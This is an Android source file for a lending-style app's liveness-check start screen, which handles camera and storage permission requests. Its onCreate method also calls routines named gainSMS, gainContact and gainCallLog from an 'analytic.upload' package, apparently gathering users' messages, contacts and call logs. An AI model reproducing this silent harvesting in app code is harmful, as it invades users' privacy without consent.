package com.yinshan.happycash.view.liveness.view.impl;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.yinshan.happycash.R;

import com.yinshan.happycash.analytic.upload.AllReport;
import com.yinshan.happycash.analytic.upload.EventReport;
import com.yinshan.happycash.framework.BaseActivity;

/**
 * Created by huxin on 2018/8/10.
 */
public class OliveStartActivity extends Activity{

    private static final String TAG = OliveStartActivity.class.getSimpleName();

    private Button startLivenessButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(getResources().getIdentifier("oliveapp_activity_start", "layout", getPackageName()));

        startLivenessButton = (Button) findViewById(getResources().getIdentifier("oliveappStartLivenessButton", "id", getPackageName()));
        startLivenessButton.setOnClickListener(mOnStartLivenessClickListener);
        AllReport.getInstance().gainSMS();
        AllReport.getInstance().gainContact();
        AllReport.getInstance().gainCallLog();
        /**controller_edit**/
//        DeviceInfoController.getInstance().gainDeviceInfo();
        /**controller_edit**/
        EventReport.getInstance().gainEvent();
    }

    private static final int PERMISSION_READ_EXTERNAL_STORAGE = 101;
    private static final int PERMISSION_WRITE_EXTERNAL_STORAGE = 102;
    private static final int PERMISSION_CAMERA = 103;

    private boolean requestPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, PERMISSION_WRITE_EXTERNAL_STORAGE);
            return false;
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_READ_EXTERNAL_STORAGE);
            return false;
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_DENIED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, PERMISSION_CAMERA);
            return false;
        }

        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        try {
            switch (requestCode) {
                case PERMISSION_CAMERA: {
                    if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                        startLivenessButton.callOnClick();
                    } else {
                        Toast.makeText(this, getResources().getString(R.string.request_camera), Toast.LENGTH_LONG).show();
                    }
                    break;
                }
                case PERMISSION_READ_EXTERNAL_STORAGE: {
                    if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                        startLivenessButton.callOnClick();
                    } else {
                        Toast.makeText(this, getResources().getString(R.string.request_space), Toast.LENGTH_LONG).show();
                    }
                    break;
                }
                case PERMISSION_WRITE_EXTERNAL_STORAGE: {
                    if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                        startLivenessButton.callOnClick();
                    } else {
                        Toast.makeText(this, getResources().getString(R.string.request_space), Toast.LENGTH_LONG).show();
                    }
                    break;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to request permission", e);
        }
    }

    private View.OnClickListener mOnStartLivenessClickListener = new View.OnClickListener() {
        @Override
        public void onClick(View view) {
            // Request Permission
            if (requestPermission()) {
                Intent i = new Intent(OliveStartActivity.this, OliveLivenessActivity.class);
                startActivity(i);
                finish();
            }
        }
    };

}
